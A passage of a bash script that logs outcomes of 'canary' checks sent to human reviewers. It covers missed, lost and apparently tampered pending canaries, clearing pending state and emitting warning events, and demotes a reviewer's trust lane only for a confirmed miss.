                '{canary_id:$cid,session_id:$sid,result:"expired"}')" \
            "canary" "info" 0 "canary"
    fi

    if type hi_record_canary_outcome &>/dev/null; then
        local _crun_action
        _crun_action=$(hi_record_canary_outcome "${human_id}" "missed" \
            "${CANARY_CLEAN_RUN_PROMOTION_THRESHOLD}" "${CANARY_AUTO_PROMOTION_ENABLED}" 2>/dev/null || true)
        if [ "${_crun_action#demoted:}" != "${_crun_action}" ] && type emit_event &>/dev/null; then
            emit_event "canary" "trust_lane_demoted" "logged" \
                "$(jq -n -c --arg cid "${canary_id}" --arg act "${_crun_action}" \
                    '{canary_id:$cid,transition:$act,clean_run_reset:true}')" \
                "canary" "warn" 0 "canary"
        fi
    fi
    if type hi_canary_clear_pending &>/dev/null; then
        hi_canary_clear_pending "${human_id}" 2>/dev/null || true
    fi
}

# v3.3.6 — bookkeeping fault, not a human miss.
# Demotion requires evidence, not absence of evidence. The human-state record
# said a canary was outstanding, but the routing artifact is gone. We clear
# the pending state and emit an internal warning. We do NOT call
# hi_record_canary_outcome and we do NOT touch trust lane.
#
# v3.3.7: this path now fires only when delivery evidence (msg_id) is empty —
# the "claim succeeded but Telegram POST never confirmed" case. When delivery
# evidence exists but the artifact is missing, the new resolve flow treats
# that as canary_missed (delivery_proven + timeout) plus a separate
# canary_artifact_destroyed_post_delivery audit. The artifact is no longer
# authoritative for the missed-vs-lost distinction.
_canary_log_pending_lost() {
    local pending_session="${1:-}" canary_id="$2" human_id="${3:?}"
    log "CANARY PENDING LOST: human ${human_id} canary ${canary_id} (session ${pending_session}) — claim succeeded but no delivery evidence (POST never confirmed), clearing pending state without demotion"

    if type emit_event &>/dev/null; then
        emit_event "canary" "canary_pending_lost" "internal_warn" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${pending_session}" --arg hid "${human_id}" \
                '{canary_id:$cid,session_id:$sid,human_id:$hid,reason:"no_delivery_evidence"}')" \
            "canary" "warn" 0 "canary"
    fi
    if type hi_canary_clear_pending &>/dev/null; then
        hi_canary_clear_pending "${human_id}" 2>/dev/null || true
    fi
}

# v3.3.7 — tampered evidence is not delivery evidence we can act on.
#
# Delivery evidence (msg_id) exists, but the .pending routing artifact's
# contents do not match the canary_id we recorded for this human. The
# system cannot rule out attacker corruption of its own bookkeeping;
# acting on a tampered artifact would let an attacker steer demotions.
# We clear pending state, emit a warn audit, and do NOT touch trust lane.
_canary_log_pending_tampered() {
    local pending_session="${1:-}" canary_id="$2" human_id="${3:?}" observed="${4:-}"
    log "CANARY PENDING TAMPERED: human ${human_id} canary ${canary_id} (session ${pending_session}) — artifact contents did not match recorded canary_id (observed=${observed:-<empty>}), clearing pending state without demotion"

    if type emit_event &>/dev/null; then
        emit_event "canary" "canary_pending_tampered" "warn" \
            "$(jq -n -c --arg cid "${canary_id}" --arg sid "${pending_session}" --arg hid "${human_id}" --arg obs "${observed}" \
                '{canary_id:$cid,session_id:$sid,human_id:$hid,observed_artifact:$obs,reason:"artifact_contents_mismatch"}')" \
            "canary" "warn" 0 "canary"
    fi
    if type hi_canary_clear_pending &>/dev/null; then
        hi_canary_clear_pending "${human_id}" 2>/dev/null || true
    fi
}
